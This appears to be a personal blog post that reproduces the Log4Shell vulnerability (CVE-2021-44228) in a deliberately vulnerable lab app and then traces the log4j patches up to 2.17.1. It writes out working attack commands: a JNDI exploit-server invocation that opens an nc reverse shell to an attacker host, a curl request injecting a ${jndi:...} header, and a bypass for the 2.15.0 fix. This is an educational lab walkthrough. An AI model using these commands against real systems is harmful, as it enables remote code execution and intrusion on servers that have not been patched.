---
title: "Follow log4j vulnerability: from 2.14.1 to 2.17.1"
categories:
  - Security
tags:
  - Java
  - Vulnerability
last_modified_at: 2022-01-24
author_profile: true
sitemap:
  changefreq: daily
  priority: 1.0
---

I triggered a log4j vulnerability for a test and followed patches from 2.14.1 to 2.17.1 of log4j.

## How to trigger log4j vulnerability

There are several vulnerabilities for log4j.
Among them, I chose [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) and
triggered a reverse shell: executing shell commands from a remote machine.

1. Build a vulnerable environment: [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app).
Clone this repository and `docker build ./`.
FYI, this environment is based on [spring-boot-starter-log4j2:2.6.1](https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2/2.6.1)
so it uses 2.14.1 for log4j.

2. Download [JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0) and run the command below.
I add a command to take a reverse shell. You can change the command inside of `"`.

```
$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc <VICTIM_IP> 4444 -e /bin/sh" -A <ATTACKER_IP>
```

3. Open 4444 port with `nc -lvp 4444` in the attacker machine.

4. Send a header with the command below.

```
curl <VICTIM_IP>:8080 -H 'X-Api-Version:${jndi:<TARGET_ENV>}'
```

The result is looks like this:

![preview](https://user-images.githubusercontent.com/62553200/150686717-6c8216ac-8ee4-4b3d-9dc1-a3a6fdcfb027.png)

On the top right window, you can see that `ls` command is working well!

## Follow patches

All the changes of each log4j version are on here: [Log4j – Changes](https://logging.apache.org/log4j/2.x/changes-report.html).
I picked only patches related to vulnerabilities in the table below.

|Version|Vulnerability|Related PR|
|:---:|:---|:---|
|2.15.0|[Limit the protocols JNDI](https://issues.apache.org/jira/browse/LOG4J2-3201)|[Restrict LDAP access via JNDI #608](https://github.com/apache/logging-log4j2/pull/608)|
|2.16.0|[Disable JNDI by default](https://issues.apache.org/jira/browse/LOG4J2-3208) and [Remove support for Lookups in messages](https://issues.apache.org/jira/browse/LOG4J2-3211)|[LOG4J2-3211 - Remove Messge Lookups #623](https://github.com/apache/logging-log4j2/pull/623)|
|2.17.0|[Fix string substitution recursion](https://issues.apache.org/jira/browse/LOG4J2-3230)|[[2.12 backport] Fix string substitution recursion #641](https://github.com/apache/logging-log4j2/pull/641)|
|2.17.1|[JdbcAppender uses JndiManager to access JNDI resources](https://issues.apache.org/jira/browse/LOG4J2-3293)|[Refactor to reuse existing code](https://issues.apache.org/jira/browse/LOG4J2-3293)|

In `2.15.0`, the method I wrote above is not working but it is still vulnerable to commands using `jndi`.
(Can be bypassed by adding `127.0.0.1#` right after `ldap://`.)
Because of this `jndi` issue, JNDI is disabled by default in `2.16.0`.
If your service uses log4j, it is now highly recommended to update a log4j version to `2.17.1`.

## References

- [사상 최악! Log4J 해커들의 공격. 대응방법은?](https://youtu.be/2mpwuRXefG8)
- [Apache log4j 취약점 CVE-2021-44228 POC](https://isacacia.tistory.com/153)
- [How Log4j Vulnerability Could Impact You](https://securityintelligence.com/posts/apache-log4j-zero-day-vulnerability-update/?social_post=6049654379&linkId=144150205)
- [Analysing and Reproducing PoC for Log4j 2.15.0](https://secariolabs.com/research/analysing-and-reproducing-poc-for-log4j-2-15-0)

---

💬 _Any comments and suggestions will be appreciated._
